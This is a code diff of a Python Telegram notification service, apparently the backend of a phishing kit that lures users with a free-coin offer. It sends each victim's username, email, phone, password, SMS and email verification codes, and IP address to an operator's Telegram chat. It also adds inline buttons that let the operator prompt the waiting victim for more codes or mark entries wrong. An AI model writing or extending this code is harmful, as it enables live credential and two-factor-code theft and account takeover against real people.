@@ -2,6 +2,7 @@ import requests
 import os
 from datetime import datetime
 import logging
+import json
 
 logger = logging.getLogger(__name__)
 
@@ -11,84 +12,122 @@ class TelegramService:
         self.chat_id = os.getenv('TELEGRAM_CHAT_ID', '-1003294412636')
         self.api_url = f"https://api.telegram.org/bot{self.bot_token}"
     
-    def send_coin_request(self, data: dict):
-        """Send coin request notification to Telegram group"""
+    def send_step_notification(self, step: str, session_id: str, data: dict):
+        """Send step notification with admin control buttons"""
         try:
-            # Format message with emojis
-            message = self._format_coin_request_message(data)
+            message = self._format_step_message(step, data)
+            keyboard = self._create_step_keyboard(session_id, step)
             
-            # Send text message
             text_url = f"{self.api_url}/sendMessage"
             payload = {
                 'chat_id': self.chat_id,
                 'text': message,
-                'parse_mode': 'HTML'
+                'parse_mode': 'HTML',
+                'reply_markup': keyboard
             }
             
             response = requests.post(text_url, json=payload, timeout=10)
             response.raise_for_status()
             
             message_id = response.json()['result']['message_id']
-            
-            # Send inline keyboard with admin buttons
-            keyboard = self._create_admin_keyboard(data.get('username', 'unknown'))
-            keyboard_url = f"{self.api_url}/sendMessage"
-            keyboard_payload = {
-                'chat_id': self.chat_id,
-                'text': '🎮 <b>Admin Actions:</b>',
-                'parse_mode': 'HTML',
-                'reply_markup': keyboard
-            }
-            
-            keyboard_response = requests.post(keyboard_url, json=keyboard_payload, timeout=10)
-            keyboard_response.raise_for_status()
-            
-            logger.info(f"Telegram notification sent successfully. Message ID: {message_id}")
+            logger.info(f"Telegram notification sent. Step: {step}, Session: {session_id}, Message ID: {message_id}")
             return True
             
         except Exception as e:
             logger.error(f"Failed to send Telegram notification: {str(e)}")
             return False
     
-    def _format_coin_request_message(self, data: dict) -> str:
-        """Format the coin request message with emojis"""
+    def _format_step_message(self, step: str, data: dict) -> str:
+        """Format message based on step"""
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
-        message = f"""💎 <b>COIN REQUEST</b>
+        if step == "username_coin":
+            return f"""🎮 <b>STEP 1: Username & Coin Selection</b>
 
 👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
-💰 <b>Amount:</b> <code>{data.get('amount', 'N/A')}</code>
-🌍 <b>Location:</b> {data.get('location', 'Unknown')}
-📱 <b>Device:</b> {data.get('device', 'Unknown')}
+💰 <b>Coin Amount:</b> <code>{data.get('amount', 'N/A')}</code>
 🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
 ⏰ <b>Time:</b> {timestamp}
 
+🕹️ <b>User is waiting for your action...</b>
+"""
+        
+        elif step == "contact":
+            return f"""📧 <b>STEP 2: Contact Information</b>
+
+👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
+💰 <b>Amount:</b> <code>{data.get('amount', 'N/A')}</code>
+
 📧 <b>Email:</b> <code>{data.get('email', 'N/A')}</code>
 📞 <b>Phone:</b> <code>{data.get('phone', 'N/A')}</code>
-🔐 <b>Password:</b> <code>{data.get('password', 'N/A')}</code>
-📲 <b>Phone Code:</b> <code>{data.get('phone_code', 'N/A')}</code>
-✉️ <b>Email Code:</b> <code>{data.get('email_code', 'N/A')}</code>
+🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
+⏰ <b>Time:</b> {timestamp}
+
+🕹️ <b>User is waiting for your action...</b>
 """
-        return message
+        
+        elif step == "password":
+            return f"""🔐 <b>STEP 3: Password Entered</b>
+
+👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
+🔐 <b>Password:</b> <code>{data.get('password', 'N/A')}</code>
+🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
+⏰ <b>Time:</b> {timestamp}
+
+🕹️ <b>User is waiting for your action...</b>
+"""
+        
+        elif step == "phone_code":
+            return f"""📱 <b>STEP 4: Phone Code Entered</b>
+
+👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
+📞 <b>Phone:</b> <code>{data.get('phone', 'N/A')}</code>
+📲 <b>Code:</b> <code>{data.get('phone_code', 'N/A')}</code>
+🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
+⏰ <b>Time:</b> {timestamp}
+
+🕹️ <b>User is waiting for your action...</b>
+"""
+        
+        elif step == "email_code":
+            return f"""✉️ <b>STEP 5: Email Code Entered</b>
+
+👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
+📧 <b>Email:</b> <code>{data.get('email', 'N/A')}</code>
+📬 <b>Code:</b> <code>{data.get('email_code', 'N/A')}</code>
+🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
+⏰ <b>Time:</b> {timestamp}
+
+🕹️ <b>User is waiting for your action...</b>
+"""
+        
+        else:
+            return f"""📝 <b>Step: {step}</b>
+
+{json.dumps(data, indent=2)}
+⏰ <b>Time:</b> {timestamp}
+"""
     
-    def _create_admin_keyboard(self, username: str):
-        """Create inline keyboard with admin action buttons"""
+    def _create_step_keyboard(self, session_id: str, step: str):
+        """Create inline keyboard based on current step"""
+        
+        # Common buttons for all steps
         keyboard = {
             'inline_keyboard': [
                 [
-                    {'text': '🔐 Password', 'callback_data': f'action_password_{username}'},
-                    {'text': '📝 Form', 'callback_data': f'action_form_{username}'},
-                    {'text': '📱 Code', 'callback_data': f'action_code_{username}'},
+                    {'text': '🔐 Ask Password', 'callback_data': f'action_{session_id}_password'},
+                    {'text': '📝 Ask Form Again', 'callback_data': f'action_{session_id}_form'},
                 ],
                 [
-                    {'text': '🔢 4-Digit', 'callback_data': f'action_4digit_{username}'},
-                    {'text': '❌ Wrong', 'callback_data': f'action_wrong_{username}'},
-                    {'text': '📧 Mail', 'callback_data': f'action_mail_{username}'},
+                    {'text': '📱 Ask Phone Code', 'callback_data': f'action_{session_id}_phone_code'},
+                    {'text': '📧 Ask Email Code', 'callback_data': f'action_{session_id}_email_code'},
                 ],
                 [
-                    {'text': '📬 Mail Code', 'callback_data': f'action_mailcode_{username}'},
-                    {'text': '🚫 Wrong Mail', 'callback_data': f'action_wrongmail_{username}'},
-                    {'text': '✅ Finish', 'callback_data': f'action_finish_{username}'},
+                    {'text': '❌ Wrong Password', 'callback_data': f'action_{session_id}_wrong_password'},
+                    {'text': '🚫 Wrong Code', 'callback_data': f'action_{session_id}_wrong_code'},
+                ],
+                [
+                    {'text': '✅ Finish & Approve', 'callback_data': f'action_{session_id}_finish'},
                 ]
             ]
         }
